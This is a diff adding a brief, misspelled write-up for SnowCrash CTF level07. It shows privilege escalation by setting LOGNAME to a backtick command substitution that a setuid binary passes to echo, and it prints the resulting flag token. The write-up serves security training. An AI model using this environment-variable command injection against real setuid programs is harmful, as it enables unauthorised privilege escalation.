@@ -1,0 +1,46 @@
+Tring revers enginerieng the binary file level07
+
+strings level07
+
+LOGNAME		There's certenly a variable
+/bin/echo %s    probably we print the LOGNAME value
+
+
+asprintf
+
+setresuid   set the user and the group id 
+setresgid
+
+getegid     to get the extended group id
+geteuid     to get the extended user id
+
+
+Executing the binary file
+level07@SnowCrash:~$ ./level07 
+level07
+
+
+level07@SnowCrash:~$ ls -la level07 
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+
+with the output of the strings and the ls, we can supose that the programe get the uid of the flag07 user and we can execute the binary file with level07 same as the with the permission of the flag07
+
+the LOGNAME is probably the name of the current user saved in $LOGNAME val
+
+level07@SnowCrash:~$ export LOGNAME='test'
+level07@SnowCrash:~$ ./level07 
+test
+
+so ours suposition is verrified 
+
+so we will exploiate the echo commande and execute getflag through it, 
+
+comme the echo is a built in commande we can not change the binary file like in the previous exo, so we'll execute the getflag through the the variable
+
+level07@SnowCrash:~$ export LOGNAME=\`getflag\` ; ./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+
+
+
+
